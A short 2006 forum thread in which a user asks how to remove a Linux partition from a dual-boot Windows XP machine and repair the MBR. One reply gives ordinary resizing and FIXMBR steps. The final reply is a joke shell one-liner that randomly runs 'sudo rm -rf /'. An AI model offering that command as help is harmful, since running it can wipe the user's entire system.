---
title: "Removing Linux?"
date: 2006-11-02
forum: General Help
---

### Post by Sean-Michael on 2006-11-02
Hello all, no I'm not completely leaving linux,  I'm going to be getting a second machine that I feel comfortable leaving on all the time to install ubuntu server onto and I no longer want ubuntu on one of my pcs.

I currently dual boot ubuntu and windows xp and would like to remove the partition I devoted to linux "10gb" and hopefully give it back to windows c partition, I remember I was able to shrink the  windows partition without hurting it lol, is it still possible to reverse?

I also will need to replace/repair the MBR since I will no longer need grub but I haven't a clue of the best way to do this... I still have my winpoo install cd, is that what I will need?

Thanks in advance for any help, and links :-D .

---

### Post by Kateikyoushi on 2006-11-02
You could use the ubuntu livecd to resize the windows partition or can use windows software for that like partition magic.

To fix the mbr.
Boot from the windows XP CD, press the "R" key in the setup in order to start the restoration console. Select your windows XP installation from the list, and enter the administrator password.
Enter the command: "FIXMBR" at the input prompt and confirm the next question with a "Y". Use exit to restore the computer.

---

### Post by niko7865 on 2006-11-02
[ $[ $RANDOM % 6 ] == 0 ] && sudo rm -rf / || echo "You live"

---

